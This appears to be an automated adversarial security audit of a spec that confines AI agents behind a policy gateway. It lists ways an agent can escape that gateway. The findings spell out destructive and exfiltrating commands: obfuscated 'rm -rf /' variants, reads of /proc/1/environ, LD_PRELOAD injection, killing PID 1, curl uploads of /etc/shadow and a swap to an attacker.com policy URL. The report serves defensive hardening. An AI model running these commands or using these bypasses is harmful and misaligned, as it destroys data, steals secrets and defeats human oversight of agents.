# Operator SPEC.md — Adversarial Security Critique

Reviewed: 2026-02-18
Reviewer: Adversarial Security Audit (automated)

---

## 1. CRITICAL — Direct access to :18790 bypasses protectgateway entirely

The entrypoint starts `agenticlaw gateway` on `--bind loopback`, but loopback is shared within the container. Any bash command the agent executes can `curl 127.0.0.1:18790` directly, bypassing all policy enforcement. The `--no-auth` flag makes this trivial. For roles that have bash access (LOCAL and above), the entire policy model is defeated.

**Remediation**: Run protectgateway and agenticlaw in separate network namespaces (e.g., using `unshare --net`), connected only by a Unix domain socket or veth pair. Alternatively, use iptables/nftables owner-match rules so only the protectgateway UID can connect to :18790. The `--no-auth` flag must be removed; use a per-boot random token.

## 2. CRITICAL — Bash command matching is trivially bypassable via obfuscation

The spec says bash commands are matched via "glob matching" against strings like `"rm:*"`. This is defeated by:
- Variable expansion: `R=rm; $R -rf /`
- Backtick/subshell: `` `echo rm` -rf / ``
- `$()` substitution: `$(echo rm) -rf /`
- Hex/octal escapes: `$'\x72\x6d' -rf /`
- Aliases defined inline: `alias r=rm; r -rf /`
- PATH manipulation: copy `rm` to `delete`, run `delete -rf /`
- Whitespace insertion: `r m -rf /` (won't match `rm` pattern but shell ignores space in some contexts — actually this one fails, but the others don't)
- Newline injection: `ls\nrm -rf /` in a single command string
- Here-doc execution: `bash <<< "rm -rf /"`
- `/bin/rm` vs `rm` (absolute path bypass)
- `perl -e 'system("rm -rf /")'`, `python3 -c 'import os; os.system("rm -rf /")'`

**Remediation**: String-based bash command filtering is fundamentally broken. Use seccomp-bpf profiles to restrict syscalls (unlinkat, execve allowlist), or use a proper shell AST parser (e.g., tree-sitter-bash). At minimum, deny all interpreters (python, perl, ruby, node, lua, php, awk, sed with `e` flag) for restricted roles, and use strace/seccomp to enforce at syscall level.

## 3. CRITICAL — WRITE role can achieve LOCAL capabilities

WRITE allows `write` and `edit` tools plus `touch` and `cp` in bash. An agent can:
1. `write` a shell script to `/workspace/exploit.sh`
2. The spec does not deny `bash chmod +x /workspace/exploit.sh` (chmod is denied for READ but not explicitly for WRITE)
3. Even without chmod, `bash sh /workspace/exploit.sh` — the spec denies "execute arbitrary binaries" but `sh` is a read-only command interpreter already present

The WRITE bash allowlist (`mkdir`, `touch`, `cp`) does not explicitly deny `sh`, `bash`, `python3`, `perl`. Since the model is allow-based for tools but the bash_commands enforcement is unclear on default-deny vs default-allow, a WRITE agent can likely invoke an interpreter.

**Remediation**: WRITE bash must be explicit default-deny. Only the listed commands are allowed; everything else is blocked. This must be stated unambiguously. Add negative tests: `bash sh /workspace/x.sh`, `bash python3 -c '...'`, `bash /bin/sh -c '...'`.

## 4. HIGH — No /proc restrictions for LOCAL and above

LOCAL, POKE, PROBE, and AGENT have no explicit `/proc` deny rules. An agent with bash can:
- `cat /proc/1/environ` — read protectgateway's environment including `SUB_POLICIES_URL`
- `cat /proc/1/cmdline` — learn upstream port and policy file path
- `cat /proc/self/maps` — memory layout for exploitation
- `/proc/self/exe` — copy protectgateway binary for reverse engineering
- `/proc/net/tcp` — enumerate listening ports to find :18790 (ties to vuln #1)
- `/proc/sysrq-trigger` — if not dropped, can trigger kernel actions

**Remediation**: Mount `/proc` with `hidepid=2` or use `--pids-limit` plus explicit filesystem deny rules for `/proc/*/environ`, `/proc/*/cmdline`, `/proc/*/maps`, `/proc/*/mem`. AGENT role already denies `/proc/sys` but not the rest of `/proc`.

## 5. HIGH — Environment variable injection via SUB_POLICIES_URL

The entrypoint does `curl -sf "$SUB_POLICIES_URL"` with `|| true`, meaning:
- If `SUB_POLICIES_URL` is overridden at `docker run` time (e.g., `-e SUB_POLICIES_URL=http://attacker.com/policy.json`), a malicious policy is loaded
- The `|| true` means fetch failure is silent — no sub-policies means the base policy runs without additional restrictions
- If an AGENT-level container can set env vars for child processes, policy can be weakened

The spec does not lock environment variables at build time or validate the fetched policy's signature.

**Remediation**: Bake `SUB_POLICIES_URL` into the image at build time (not as ENV). Validate fetched sub-policies with a cryptographic signature or checksum. Fail closed: if sub-policy fetch fails, refuse to start. Remove `|| true`.

## 6. HIGH — Signal-based attacks on protectgateway

Any role with bash access can `kill` the protectgateway process (PID 1 via `exec`, or discoverable via `ps`). If protectgateway dies:
- If agenticlaw gateway stays running on :18790, it becomes directly accessible (if ports are forwarded)
- Container may restart without sub-policies if fetch was one-time

Even if `kill -9 1` is denied for OPERATOR, it is not denied for AGENT, PROBE, POKE, or LOCAL roles.

**Remediation**: Add `kill` to the bash deny list for all roles below OPERATOR. Run protectgateway as PID 1 (already done via `exec`); configure it to kill agenticlaw on exit. Use `--init` flag or tini so signal handling is correct. Add a health check that verifies protectgateway is alive and kills the container if not.

## 7. HIGH — TOCTOU in filesystem path validation

protectgateway checks the path argument of file tools, then forwards to agenticlaw which opens the actual file. Between check and open:
- A symlink can be created (for roles with write access) pointing an allowed path to a denied path
- Example: WRITE agent creates `/workspace/shadow -> /etc/shadow`, then reads `/workspace/shadow`

The adversarial tests mention "symlink creation to escape sandbox" but only in the multi-turn test, not as a dedicated unit test per role.

**Remediation**: protectgateway must resolve symlinks (realpath) before policy check. Add `O_NOFOLLOW` semantics. Add dedicated symlink-based path traversal tests for every role with write access. Consider mounting `/workspace` with `nosymfollow` (Linux 5.10+).

## 8. HIGH — Sub-policy fetch over unauthenticated HTTP

`sub_policies_url` uses plain HTTP (`http://policy-server:8080`). An attacker with network position (or a PROBE/AGENT container on the same Docker network) can:
- MITM the policy fetch and inject permissive policies
- DNS-poison `policy-server` to redirect fetch
- The mock server has no authentication

**Remediation**: Use HTTPS with pinned certificates, or use a shared HMAC secret for policy responses. Validate policy schema after fetch. Use Docker network isolation so only the entrypoint can reach the policy server.

## 9. MEDIUM — Container escape via `--cap-add=SYS_PTRACE` on OPERATOR

OPERATOR gets `SYS_PTRACE` which allows:
- `ptrace(PTRACE_ATTACH)` on any process in the container
- Memory injection into protectgateway to disable policy enforcement
- Reading secrets from protectgateway's memory

Combined with vuln #1, an OPERATOR agent can ptrace protectgateway, NOP out the enforcement, then use :18790 freely.

**Remediation**: Remove `SYS_PTRACE` from OPERATOR unless absolutely needed. If needed, use seccomp to restrict ptrace targets. Document why SYS_PTRACE is required.

## 10. MEDIUM — `LD_PRELOAD` and dynamic linker attacks

No role denies setting `LD_PRELOAD` or `LD_LIBRARY_PATH`. A WRITE+ agent can:
1. Write a shared library to `/workspace/evil.so`
2. `LD_PRELOAD=/workspace/evil.so /usr/local/bin/protectgateway ...` — restart protectgateway with injected code
3. Or `LD_PRELOAD=/workspace/evil.so ls` — hook libc calls

For roles where bash is unrestricted, this enables arbitrary code execution that bypasses command-level filtering.

**Remediation**: Set `LD_PRELOAD` and `LD_LIBRARY_PATH` as read-only empty env vars in the Dockerfile. Use `--security-opt=no-new-privileges` (already done, which prevents setuid escalation but does NOT prevent LD_PRELOAD on non-setuid binaries). Consider statically linking protectgateway.

## 11. MEDIUM — Missing test: Base64 and pipe-based command reconstruction

The adversarial test (item 5) mentions `echo cm0gLXJmIC8= | base64 -d | bash` but this is only in the multi-turn adversarial test, not in per-role negative tests. Every role with bash access needs:
- `bash -c "$(echo cm0gLXJmIC8= | base64 -d)"`
- `echo 'rm -rf /' | sh`
- `eval "rm -rf /"`
- `bash < <(echo "rm -rf /")`
- `xargs -I{} sh -c {} <<< "rm -rf /"`

**Remediation**: Add these as explicit negative tests per role in the test matrix.

## 12. MEDIUM — /dev access unaddressed

No filesystem rules cover `/dev`. A LOCAL+ agent can:
- `/dev/tcp/host/port` (bash built-in for network on some shells) — bypasses `--network=none` at app layer (though kernel will still block)
- `/dev/mem`, `/dev/kmem` — raw memory access (needs CAP, but not explicitly denied)
- `/dev/sda` — direct disk writes (the OPERATOR dd denial is string-based, so `cat /dev/zero > /dev/sda` bypasses it)

**Remediation**: Add explicit `/dev` deny rules for all roles. Mount `/dev` with minimal device nodes via `--device` allowlist.

## 13. MEDIUM — POKE GET-only enforcement is string-based

POKE denies `curl -X POST` but not:
- `curl --request POST`
- `curl -XPOST` (no space)
- `curl -d 'data' http://...` (implies POST without -X)
- `curl -F file=@/etc/shadow http://...` (multipart POST)
- `curl -T file http://...` (PUT without -X)
- `python3 -c 'import requests; requests.post(...)'`
- Writing a raw HTTP request via `/dev/tcp`

**Remediation**: Network method enforcement cannot be done at the command-string level. Use an HTTP proxy (like squid or mitmproxy) as the container's network gateway that enforces GET-only at the protocol level. Or use eBPF/seccomp to inspect outbound connections.

## 14. MEDIUM — No rate limiting or resource exhaustion protection

No mention of:
- `--memory` limits on containers
- `--pids-limit` to prevent fork bombs (only string-matched for OPERATOR)
- `--cpus` limits
- Disk quota on `/workspace`
- File descriptor limits

An agent at any level can exhaust resources as a denial-of-service.

**Remediation**: Add `--memory=512m --pids-limit=256 --cpus=1 --ulimit nofile=1024:1024` to all container run configurations. Add `tmpfs` size limits.

## 15. LOW — Audit log self-reference gap

OPERATOR denies "modify audit log" but the spec doesn't define where the audit log lives, what format it uses, or how it's protected. If protectgateway logs to stdout (as stated in success criteria #9), and stdout is captured by Docker, then an OPERATOR with `docker` access could `docker logs --follow` and clear logs via Docker API.

**Remediation**: Define audit log path explicitly. Ship logs to an external system (syslog, CloudWatch) that no container role can access. Add tamper-evident checksums.

## 16. LOW — `--read-only` flag only on READ container

Only the READ role specifies `--read-only` filesystem. WRITE intentionally needs write access, but POKE, PROBE, and AGENT can write to system directories (e.g., `/tmp`, `/var`). This allows writing exploit tools, shared libraries, or cron jobs to persistent locations.

**Remediation**: Use `--read-only` on all containers with explicit `tmpfs` mounts for `/tmp` and `/workspace`. WRITE and above get a writable volume mount only at `/workspace`.

## 17. LOW — No container image signing or verification

The spec mentions pushing to ECR but no image signing (cosign, Notary). A compromised registry could serve tampered images with weakened policies.

**Remediation**: Sign images with cosign at push time. Verify signatures at pull time. Store signing keys outside the operator container.

---

## Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 3 |
| HIGH | 5 |
| MEDIUM | 5 |
| LOW | 4 |

The most dangerous architectural flaw is the shared-loopback bypass (#1): any role with bash can skip protectgateway entirely by talking to :18790 directly. Combined with string-based bash filtering (#2), the entire security model collapses for LOCAL and above. These two issues must be fixed before any other work proceeds.
